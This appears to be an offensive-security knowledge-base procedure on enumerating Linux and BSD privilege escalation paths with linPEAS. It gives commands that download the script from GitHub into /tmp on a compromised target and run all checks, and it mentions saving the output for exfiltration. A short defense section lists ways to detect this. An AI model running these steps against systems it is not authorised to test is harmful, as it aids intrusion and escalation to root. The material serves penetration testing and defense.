---
type: procedure
verified: true
submitted: true
created_at: '2020-03-22T20:49:40.657781+00:00'
updated_at: '2023-05-26T00:46:59.578445+00:00'
tactics:
  - '[[Discovery]]'
  - '[[Persistence]]'
  - '[[Privilege Escalation]]'
techniques:
  - '[[Account Discovery]]'
  - '[[File and Directory Discovery]]'
  - '[[File System Permissions Weakness]]'
  - '[[Permission Groups Discovery]]'
  - '[[Process Discovery]]'
  - '[[System Information Discovery]]'
  - '[[System Network Configuration Discovery]]'
  - '[[System Service Discovery]]'
sub_techniques: []
tags:
  - enumeration
  - misconfiguration
commands:
  - '[[commands/download-linpeas-script]]'
  - '[[commands/run-linpeas-all-checks]]'
platforms:
  - Linux
  - BSD
tools:
  - '[[tools/linPEAS]]'
validated: true
---

# Enumerate-Linux-Privilege-Escalation-Paths-linPEAS

## Summary

This procedure uses the linPEAS (Linux Privilege Escalation Awesome Script) tool to automatically enumerate a Linux or BSD system for potential privilege escalation vectors, including misconfigurations, vulnerable software, weak permissions, and other common issues that could allow escalation from a low-privilege shell to root access.

## Description

linPEAS is a comprehensive enumeration script designed for offensive security testing on Unix-like systems. It scans for a wide range of privilege escalation opportunities, such as SUID binaries, writable cron jobs, weak file permissions, outdated kernel versions, and environment variables that could be exploited. This procedure is typically used during post-exploitation phases after gaining initial shell access to a target Linux server. The script outputs color-coded results, with red and yellow highlights indicating high-potential vectors for further manual investigation and exploitation. Running it requires shell access and basic file transfer capabilities, and it helps identify paths to persistence or higher privileges without manual enumeration of every system aspect.

## Requirements

1. Shell access to the target Linux or BSD system (e.g., via SSH or reverse shell).
2. Ability to download files to the target (e.g., via wget, curl, or transfer from attacker machine).
3. Execute permissions on downloaded files (basic bash environment).
4. Sufficient disk space for the script (~1MB) and temporary files during execution.

## Defense

Defensive measures and detection strategies:

- Monitor for unusual file downloads and executions in /tmp or user directories (e.g., via auditd or sysdig).
- Implement application whitelisting to restrict script execution (e.g., AppArmor or SELinux profiles limiting bash scripts).
- Enable process auditing for privilege escalation attempts and anomalous system queries (e.g., using Falco or OSSEC).
- Regularly patch systems and audit permissions to reduce the vectors linPEAS identifies.

## Objectives

1. Identify misconfigurations and vulnerabilities enabling privilege escalation.
2. Collect system information for targeted exploitation.
3. Highlight high-risk areas (red/yellow outputs) for immediate follow-up.
4. Achieve a comprehensive enumeration report without manual effort.

## Instructions

### Step 1: Download linPEAS Script

**Context**: Obtain the latest linPEAS script from the official GitHub releases to ensure it includes all current checks for privilege escalation paths. This step transfers the script to the target system for local execution, minimizing network dependencies during the scan.

**Command** ([[commands/download-linpeas-script]]):
```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -O /tmp/linpeas.sh
```

> This command uses wget to download the script directly to /tmp, a common temporary directory with write access for unprivileged users. If wget is unavailable, alternatives like curl can be used. Verify the download integrity by checking the file size (~500KB) and ensuring no errors in the output.

### Step 2: Make Script Executable

**Context**: Grant execution permissions to the downloaded script so it can run without errors. This is a standard preparation step to avoid permission-denied issues during enumeration.

**Command**:
```bash
chmod +x /tmp/linpeas.sh
```

> The chmod command sets the executable bit on the file. Expected output is silent success (no output if successful). Confirm with `ls -l /tmp/linpeas.sh` showing `-rwxr-xr-x` permissions.

### Step 3: Execute linPEAS with All Checks

**Context**: Run the full enumeration scan to probe the system for privilege escalation opportunities. The `-a` flag enables all checks, providing the most comprehensive results, including hidden files, cron jobs, and service configurations.

**Command** ([[commands/run-linpeas-all-checks]]):
```bash
/tmp/linpeas.sh -a
```

> This launches the script, which will output a detailed report to the terminal. Pay attention to sections marked in red (high risk, e.g., writable /etc/passwd) or yellow (medium risk, e.g., outdated packages). The scan may take 1-5 minutes depending on system size. Redirect output to a file if needed (`> enum.txt`) for later analysis or exfiltration.
